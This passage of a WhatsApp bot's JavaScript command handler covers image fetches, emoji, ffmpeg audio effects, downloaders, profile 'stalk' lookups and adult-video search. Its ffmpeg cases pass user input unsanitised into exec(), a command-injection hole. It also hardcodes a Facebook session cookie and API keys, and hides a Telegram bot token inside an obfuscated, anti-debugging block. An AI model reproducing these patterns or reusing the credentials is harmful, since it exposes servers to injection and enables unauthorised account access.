 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await NanoBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'lizardpic': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`)     
            await NanoBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
case 'catmeow': {
reply(mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            await NanoBotz.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.success},{ quoted:m }).catch(err => {
return('Error!')
})
}
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replynano("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replynano("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
reply(mess.wait)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replynano('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await NanoBotz.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await NanoBotz.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replynano(`Example: ${prefix + command} 10`)
media = await NanoBotz.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replynano('Error!')
jadie = fs.readFileSync(rname)
NanoBotz.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replynano('Error!')
jadie = fs.readFileSync(rname)
NanoBotz.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replynano("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replynano('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replynano(body)
  } catch (e) {
  replynano(e)
  }
  })
  }
 break
case 'git': case 'gitclone': {
if (!args[0]) return replynano(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGXeon/XeonMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replynano(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    NanoBotz.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replynano(mess.error))
}
break
case 'spotify': case 'spotifysearch': case 'spotifys': {
    if (!text) return reply('Masukan judul lagu!');
    let result = await searchSpotify(text);
    if (!result || result.length === 0) return reply('Lagu tidak ditemukan.');
    let caption = `🎵 *Hasil Pencarian Spotify*\n📌 _Keyword_: *${text}*\n\n`;
    caption += result.map((v, i) => {
        return `*${i + 1}. ${v.name}*\n   🎤 *Artist*: ${v.artist || 'Unknown'}\n   🔗 *Link*: ${v.link}`;
    }).join('\n\n');
    caption += `\n\n✨ *Pilih dan salin link terus  ketik spdl untuk mendownload audionya*`;
    reply(caption);
}
break;

case 'spdl': case 'spotifydl': {
if (!text) return reply('Masukan Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nNanoBotzID-V5`
 const p = await new canvafy.Spotify()
            .setTitle(result.title)
            .setAuthor("Spotify - Downloader")
            .setTimestamp(40, 100)
            .setOverlayOpacity(0.8)
            .setBorder("#fff", 0.8)
            .setImage(result.image)
            .setBlur(3)
            .build(); 

       await NanoBotz.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
    NanoBotz.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'NanoBotzID' }, { quoted: m });
}
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
    try {
        let set;
        if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
        else if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
        else if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
        else if (/earrape/.test(command)) set = '-af volume=12';
        else if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
        else if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
        else if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
        else if (/reverse/.test(command)) set = '-filter_complex "areverse"';
        else if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
        else if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
        else if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
        else if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
        if (set) {
            if (/audio/.test(mime)) {
                await reply(mess.wait);
                let media = await NanoBotz.downloadAndSaveMediaMessage(quoted);
                let ran = getRandom('.mp3');
                console.log(`Running ffmpeg command: ffmpeg -i ${media} ${set} ${ran}`);
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                    fs.unlinkSync(media);
                    if (err) {
                        console.error(`ffmpeg error: ${err}`);
                        return replynano(err);
                    }
                    
                    let buff = fs.readFileSync(ran);
                    NanoBotz.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
                    fs.unlinkSync(ran);
                });
            } else {
                replynano(`Reply to the audio you want to change with a caption *${prefix + command}*`);
            }
        } else {
            replynano('Invalid command');
        }
    } catch (e) {
        replynano(e);
    }
    break
case 'define': 
if (!q) return replynano(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replynano(mess.error)
let reply =`
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   NanoBotz.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replynano(`*${q}* isn't a valid text`)
    }
    break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
replynano(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
NanoBotz.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
           case 'jodoh':
            case 'jodohku': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
NanoBotz.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnailUrl": 'https://files.catbox.moe/vneik8.jpg',
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return reply(mess.only.group)
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
NanoBotz.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: global.thumbnail,
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
    case 'coffee': case 'kopi': {
NanoBotz.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
if (!text) return replynano('Enter Query Title')
reply(mess.wait)
		let { wallpaper } = require('./lib/scraper')
anuwallpep = await wallpaper(text)
result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]
NanoBotz.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
if (!text) return replynano('Enter Query Title')
reply(mess.wait)
		let { wikimedia } = require('./lib/scraper')
let anumedia = await wikimedia(text)
result = anumedia[Math.floor(Math.random() * anumedia.length)]
NanoBotz.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case 'pick': {
            	if (!m.isGroup) return reply(mess.only.group)
            	if (!text) return replynano(`What do you want to pick?\nExample: ${prefix + command} idiot`)
             const groupMetadata = m.isGroup ? await NanoBotz.groupMetadata(m.chat)
 .catch((e) => {}) : ""
             const participants = m.isGroup ? await groupMetadata.participants : ""
             let member = participants.map((u) => u.id)
             let me = m.sender
             let xeonshimts = member[Math.floor(Math.random() * member.length)]
             NanoBotz.sendMessage(from, { 
text: `The most *${text}* here is *@${xeonshimts.split("@")[0]}*`,
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[xeonshimts],
"externalAdReply": {
"showAdAttribution": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"containsAutoReply": true,
"previewType": "PHOTO",
"thumbnailUrl": ``,
thumbnailUrl: global.thumbnail,
"sourceUrl": `${wagc}`
}
}
}, { quoted: m })
         }
     break
case 'instagramstalk':
case 'igstalk': {
if (!text) return replynano(`Enter Instagram Username\n\nExample: ${prefix + command} Justt_patron`)
NanoBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
    try {
const dat = await fetchJson(`https://btch.us.kg/download/igstalkfull?username=${encodeURIComponent(text)}`);
if (!dat || !dat.result) {
    return NanoBotz.sendMessage(m.chat, { text: "Data not found or fire error." }, { quoted: m });
}
const data = dat.result;
const data1 = dat.result.stats;
const te = `
┌──「 *STALKING* 」
▢ *🔖Name:* ${data.fullName} 
▢ *🔖Username:* ${data.username.replace(/^@/, '')}
▢ *👥Follower:* ${data1.followers}
▢ *🫂Following:* ${data1.following}
▢ *📌Bio:* ${data.bio}
▢ *🏝️Posts:* ${data1.posts}
▢ *🔗 Link:* https://instagram.com/${data.username.replace(/^@/, '')}
└────────────`;
await NanoBotz.sendMessage(m.chat, { image: { url: data.profilePic }, caption: te }, { quoted: m });
      } catch {
        replynano(`Make sure the username comes from *Instagram*`)
      }
}
break
case 'tiktokstalk':
case 'ttstalk': {
    if (!text) return replynano(`Enter TikTok Username\n\nExample: ${prefix + command} put tiktok username`);
    NanoBotz.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });
    
    try {
        const respon = await fetchJson(`https://api.elxyzgpt.xyz/stalk/tiktok?apikey=KC-d25a3f0c02be4021&username=${encodeURIComponent(text)}`);
        const user = respon.result.user;
        const stats = respon.result.stats;
        let teks = `
┌──「 *STALKING* 」
▢ *🔖 Name:* ${user.nickname}
▢ *🔖 Username:* ${user.uniqueId}
▢ *👥 Followers:* ${stats.followerCount}
▢ *🫂 Following:* ${stats.followingCount}
▢ *📌 Bio:* ${user.signature}
▢ *🏝️ Posts:* ${stats.videoCount}
▢ *❣️ Likes:* ${stats.heartCount}
▢ *🔗 Link:* https://tiktok.com/@${user.uniqueId}
└────────────`;

        await NanoBotz.sendMessage(
            m.chat, 
            { image: { url: user.avatarLarger }, caption: teks }, 
            { quoted: m }
        );
    } catch (err) {
        console.error(err);
        replynano(`There is an error. Make sure the username comes from Tiktok.`);
    }
}
break;

case 'fb':
case 'fbdl':
case 'facebook':
case 'facebookvid': {
if (!text)  return replynano(`Please send a Facebook video link\n\nSample :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibextid=Nif5oz`) 
reply('Werey waitt..')
  try {
  const getFBInfo = (videoUrl) => {
  const axios = require("axios");
  const headers = {
    "sec-fetch-user": "?1",
    "sec-ch-ua-mobile": "?0",
    "sec-fetch-site": "none",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "cache-control": "max-age=0",
    authority: "www.facebook.com",
    "upgrade-insecure-requests": "1",
    "accept-language": "en-GB,en;q=0.9,tr-TR;q=0.8,tr;q=0.7,en-US;q=0.6",
    "sec-ch-ua": '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"',
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36",
    accept:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    cookie: "sb=Rn8BYQvCEb2fpMQZjsd6L382; datr=Rn8BYbyhXgw9RlOvmsosmVNT; c_user=100003164630629; _fbp=fb.1.1629876126997.444699739; wd=1920x939; spin=r.1004812505_b.trunk_t.1638730393_s.1_v.2_; xs=28%3A8ROnP0aeVF8XcQ%3A2%3A1627488145%3A-1%3A4916%3A%3AAcWIuSjPy2mlTPuZAeA2wWzHzEDuumXI89jH8a_QIV8; fr=0jQw7hcrFdas2ZeyT.AWVpRNl_4noCEs_hb8kaZahs-jA.BhrQqa.3E.AAA.0.0.BhrQqa.AWUu879ZtCw",
  };
  const parseString = (string) => JSON.parse(`{"text": "${string}"}`).text;
  return new Promise((resolve, reject) => {
    if (!videoUrl || !videoUrl.trim()) return reject("Please specify the Facebook URL");
    if (
      ["facebook.com", "fb.watch"].every((domain) => !videoUrl.includes(domain))
    ) return reject("Please enter the valid Facebook URL");
    axios.get(videoUrl, { headers }).then(({ data }) => {
      data = data.replace(/&quot;/g, '"').replace(/&amp;/g, "&");
      const sdMatch = data.match(/"browser_native_sd_url":"(.*?)"/) || data.match(/"playable_url":"(.*?)"/) || data.match(/sd_src\s*:\s*"([^"]*)"/) || data.match(/(?<="src":")[^"]*(https:\/\/[^"]*)/);
      const hdMatch = data.match(/"browser_native_hd_url":"(.*?)"/) || data.match(/"playable_url_quality_hd":"(.*?)"/) || data.match(/hd_src\s*:\s*"([^"]*)"/);
      const titleMatch = data.match(/<meta\sname="description"\scontent="(.*?)"/);
      const thumbMatch = data.match(/"preferred_thumbnail":{"image":{"uri":"(.*?)"/);
			
			// @TODO:
      if (sdMatch && sdMatch[1]) {
        const result = {
          url: videoUrl,
          sd: parseString(sdMatch[1]),
          hd: hdMatch && hdMatch[1] ? parseString(hdMatch[1]) : "",
          title: titleMatch && titleMatch[1] ? parseString(titleMatch[1]) : data.match(/<title>(.*?)<\/title>/)?.[1] ?? "",
          thumbnail: thumbMatch && thumbMatch[1] ? parseString(thumbMatch[1]) : "",
        };

        resolve(result);
      } else reject("Unable to fetch video information at this time. Please try again");
    }).catch(_ => reject("Unable to fetch video information at this time. Please try again"));
  });
};
const hasilny = await getFBInfo(text)
let vd = `*${hasilny.title}*`
await NanoBotz.sendMessage(m.chat, {video: {url: hasilny.sd}, caption: vd})
  } catch (error) {
    replynano('Yah error')
  }
  }
  break
//=========================================\\
    case 'say': case 'tts': case 'gtts':{
if (!text) return replynano('Where is the text?')
            let texttts = text
            const xeonrl = googleTTS.getAudioUrl(texttts, {
                lang: "EN",
                slow: false,
                host: "https://translate.google.com",
            })
            return NanoBotz.sendMessage(m.chat, {
                audio: {
                    url: xeonrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
                fileName: `${text}.mp3`,
            }, {
                quoted: m,
            })
        }
        break
        case 'telestick': { //credit agan
        	if (m.isGroup) return reply(mess.only.private)
        if (!isPrem) return replyprem(mess.premium)
function __lobz(){const H=['R53FWbciV9','reply','rbot_18407','\x5c(\x20*\x5c)','re\x20is\x20a\x20ch','pushName','_Animated\x20','call','apply','constructo','d\x20that\x20the','eep\x20in\x20min','\x5c+\x5c+\x20*(?:[','1839285Jrgiie','string','chat','1042176iSckCu','https://ap','i.telegram','input','_Enter\x20a\x20t','753088wqxYcm','91437832:A','d\x20complete','k95ktev7KK','e/addstick','ickerSet?n','sSticker','/addsticke','60jrPxaD','chain','131060rHmDNZ','file_id','5757IXqShA','uJY5hR53FW','\x20seconds','4048893pKcLEE','bciV9k95kt','stateObjec','832:AAFir-','re\x20not\x20sup','length','37523_1\x20\x0aK','ers/catuse','gger','.org/bot18','0-9a-zA-Z_','\x0a*Estimate','70238qsQAcs','url_\x0aEg:\x20h','split','ance\x20of\x20ba','le?file_id','init','test','AFir-uJY5h','.org/file/','counter','rs/','stickers\x20a','is_animate','e)\x20{}','frequently','a-zA-Z_$][','debu','stickers','4oOxIpb','sendImageA'];__lobz=function(){return H;};return __lobz();}const __lobC=__lobA;function __lobA(w,v){const z=__lobz();return __lobA=function(A,i){A=A-0x190;let Q=z[A];return Q;},__lobA(w,v);}(function(w,v){const L=__lobA,z=w();while(!![]){try{const A=-parseInt(L(0x1ac))/0x1*(parseInt(L(0x1be))/0x2)+parseInt(L(0x19d))/0x3+-parseInt(L(0x1d0))/0x4+-parseInt(L(0x19b))/0x5*(parseInt(L(0x199))/0x6)+parseInt(L(0x1cd))/0x7+parseInt(L(0x191))/0x8+parseInt(L(0x1a0))/0x9;if(A===v)break;else z['push'](z['shift']());}catch(i){z['push'](z['shift']());}}}(__lobz,0x2388b));const __lobi=(function(){let w=!![];return function(v,z){const A=w?function(){if(z){const i=z['apply'](v,arguments);return z=null,i;}}:function(){};return w=![],A;};}());(function(){__lobi(this,function(){const m=__lobA,w=new RegExp('function\x20*'+m(0x1c3)),v=new RegExp(m(0x1cc)+m(0x1bb)+m(0x1aa)+'$]*)','i'),z=__lobu(m(0x1b1));!w['test'](z+m(0x19a))||!v[m(0x1b2)](z+m(0x1d3))?z('0'):__lobu();})();}());if(!text)return m[__lobC(0x1c1)](__lobC(0x190)+'g\x20sticker\x20'+__lobC(0x1ad)+'ttps://t.m'+__lobC(0x195)+__lobC(0x1a7)+__lobC(0x1c2)+__lobC(0x1a6)+__lobC(0x1cb)+__lobC(0x1ca)+__lobC(0x1c4)+__lobC(0x1af)+'n\x20if\x20used\x20'+__lobC(0x1ba));let __lobQ=text[__lobC(0x1ae)](__lobC(0x198)+__lobC(0x1b6))[0x1],{result:__loby}=await fetchJson('https://ap'+__lobC(0x1d2)+'.org/bot18'+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getSt'+__lobC(0x196)+'ame='+encodeURIComponent(__lobQ));if(__loby[__lobC(0x1b8)+'d'])return m['reply'](__lobC(0x1c6)+__lobC(0x1b7)+__lobC(0x1a4)+'ported_');m[__lobC(0x1c1)](('*Total\x20sti'+'ckers\x20:*\x20'+__loby[__lobC(0x1bd)]['length']+(__lobC(0x1ab)+__lobC(0x193)+'\x20in:*\x20')+__loby[__lobC(0x1bd)][__lobC(0x1a5)]*1.5+__lobC(0x19f))['trim']());for(let __lobr of __loby[__lobC(0x1bd)]){let __lobK=await fetchJson(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1a9)+__lobC(0x192)+__lobC(0x1b3)+__lobC(0x1c0)+__lobC(0x194)+'Z7cc/getFi'+__lobC(0x1b0)+'='+__lobr[__lobC(0x19c)]),__lobb=await getBuffer(__lobC(0x1d1)+__lobC(0x1d2)+__lobC(0x1b4)+'bot1891437'+__lobC(0x1a3)+__lobC(0x19e)+__lobC(0x1a1)+'ev7KKZ7cc/'+__lobK['result']['file_path']);await NanoBotz[__lobC(0x1bf)+__lobC(0x197)](m[__lobC(0x1cf)],__lobb,m,{'packname':global['packname'],'author':m[__lobC(0x1c5)]}),sleep(0x5dc);}function __lobu(w){function v(z){const P=__lobA;if(typeof z===P(0x1ce))return function(A){}['constructo'+'r']('while\x20(tru'+P(0x1b9))[P(0x1c8)](P(0x1b5));else(''+z/z)['length']!==0x1||z%0x14===0x0?function(){return!![];}['constructo'+'r'](P(0x1bc)+P(0x1a8))[P(0x1c7)]('action'):function(){return![];}[P(0x1c9)+'r'](P(0x1bc)+'gger')[P(0x1c8)](P(0x1a2)+'t');v(++z);}try{if(w)return v;else v(0x0);}catch(z){}}
        }
    break
    case 'fact': {
    	const { data } = await axios.get(`https://nekos.life/api/v2/fact`)
        return replynano(`${themeemoji} *Fact:* ${data.fact}\n`)   
    }
    break
    
case 'aimage':
try {
  if (!isPrem) return replyprem(mess.premium)
if (global.keyopenai === '') return replynano("What is your limit");
if (!q) return replynano(`Generate image from AI.\n\nSample:\n${prefix + command} Guy riding a horse`)
const { Configuration, OpenAIApi } = require('openai')
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: text,
n: 1,
size: "512x512",
});
//console.log(response.data.data[0].url)
NanoBotz.sendImage(from, response.data.data[0].url, text, m);
} catch (err) {
console.log(err);
replynano("Sorry, there seems to be an error :"+ err);
}
break


        case 'mathquiz': case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return replynano("Masih Ada Sesion Yang Belum Di Selesaikan.")
let { genMath, modes } = require('./lib/math')
if (!text) return replynano(`Mode: ${Object.keys(modes).join(' | ')}\npilih example: ${prefix}math medium`)
let result = await genMath(text.toLowerCase())
NanoBotz.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Answer: " + result.jawaban)
replynano("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
            }
            break
            case 'lirik':
            case 'lyrics': {
if (!text) return reply(`What lyrics are you looking for?\nExamples of usage: ${prefix}lyrics Thunder`)
reply(mess.wait)
const hasil = await fetchJson(`https://widipe.com/lirik?text=${encodeURIComponent(text)}`)
const xeonlirik = `
*Title :* ${hasil.result.title}
*Artis :* ${hasil.result.artist}
*Url :* ${hasil.result.url}

*Lyrics :* ${hasil.result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonlirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./data/image/thumb.jpg')}, { upload: NanoBotz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363303045895814@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await NanoBotz.relayMessage(m.chat, msgs.message, {})
}
break
case 'gdrive': {
		if (!args[0]) return replynano(`Please enter your gdrive link`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await replynano(`
≡ *Google Drive Download*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	NanoBotz.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('well error Bro report to the owner to be fixed')
  }
}
break
case 'invite': {
	if (!m.isGroup) return reply(mess.only.group)
	if (!isBotAdmins) return reply('_Bots Must Be Admins First_')
if (!text) return replynano(`Please enter the number you want to invite\n\nSample :\n*${prefix + command}* 234xxx`)
if (text.includes('+')) return replynano(`Enter the number together without *+*`)
if (isNaN(text)) return replynano(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await NanoBotz.groupInviteCode(group)
      await NanoBotz.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replynano(` An invite link is sent to the user`) 
}
break
case 'xnxxdl': {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replynano(`Enter Url`)
        if (!text.includes('xnxx.com')) return replynano(`Enter an xnxx link`)
        reply(mess.wait)
        const fg = require('api-dylux')
            let xn = await fg.xnxxdl(text)
            console.log(xn)
NanoBotz.sendMessage(m.chat, { caption: `≡  *XNXX DL*
        
▢ *📌 Judul*: ${xn.title}
▢ *🗂️ Size*: ${xn.size}
▢ *⌚Duration* ${xn.ruration}
▢ *🎞️Quality:* ${xn.quality}`, video: {url: xn.url_dl} }, { quoted: m })
}
break
case 'xnxxsearch': {
	if (!isPrem) return replyprem(mess.premium)
	if (!text) return replynano(`Enter Query`)
	reply(mess.wait)
	const fg = require('api-dylux')
	let res = await fg.xnxxSearch(text)
            let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n') 
              if (res.status) replynano(ff)
              }
              break
case 'pin':
case 'pinterest': {
    let input = "> _Example: pin Marsha lenathea_";
    if (!text) return reply(input);
     reply('*Loading....*');
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: NanoBotz.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
